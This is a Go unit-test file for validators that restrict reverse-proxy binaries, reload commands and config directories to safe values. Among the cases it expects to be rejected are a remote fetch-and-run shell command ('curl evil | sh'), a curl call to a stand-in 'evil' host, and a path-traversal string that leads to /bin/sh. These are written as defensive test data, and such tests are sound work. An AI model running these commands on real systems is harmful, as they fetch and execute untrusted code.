package cmdguard

import "testing"

func TestValidateProxyBinary(t *testing.T) {
	tests := []struct {
		name    string
		path    string
		wantErr bool
	}{
		{"empty uses default", "", false},
		{"absolute nginx", "/usr/sbin/nginx", false},
		{"absolute caddy", "/usr/local/bin/caddy", false},
		{"absolute apachectl", "/usr/sbin/apachectl", false},
		{"relative path", "nginx", true},
		{"unrecognized binary", "/bin/bash", true},
		{"shell disguised as dir", "/usr/sbin/nginx/../../../bin/sh", true},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateProxyBinary(tt.path)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateProxyBinary(%q) error = %v, wantErr %t", tt.path, err, tt.wantErr)
			}
		})
	}
}

func TestValidateProxyCommand(t *testing.T) {
	tests := []struct {
		name    string
		cmd     string
		wantErr bool
	}{
		{"empty uses default", "", false},
		{"nginx reload", "nginx -s reload", false},
		{"absolute nginx test", "/usr/sbin/nginx -t", false},
		{"systemctl reload", "systemctl reload nginx", false},
		{"service wrapper", "service apache2 reload", false},
		{"rc-service", "rc-service nginx reload", false},
		{"arbitrary shell", "bash -c 'curl evil | sh'", true},
		{"arbitrary binary", "/usr/bin/curl http://evil", true},
		{"sudo prefix", "sudo systemctl reload nginx", true},
		{"absolute sudo", "/usr/bin/sudo nginx -s reload", true},
		{"whitespace only", "   ", false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateProxyCommand("proxy_reload_cmd", tt.cmd)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateProxyCommand(%q) error = %v, wantErr %t", tt.cmd, err, tt.wantErr)
			}
		})
	}
}

func TestValidateConfigDir(t *testing.T) {
	if err := ValidateConfigDir(""); err != nil {
		t.Errorf("empty config dir should pass: %v", err)
	}
	if err := ValidateConfigDir("/etc/nginx/conf.d"); err != nil {
		t.Errorf("absolute config dir should pass: %v", err)
	}
	if err := ValidateConfigDir("conf.d"); err == nil {
		t.Error("relative config dir should be rejected")
	}
}
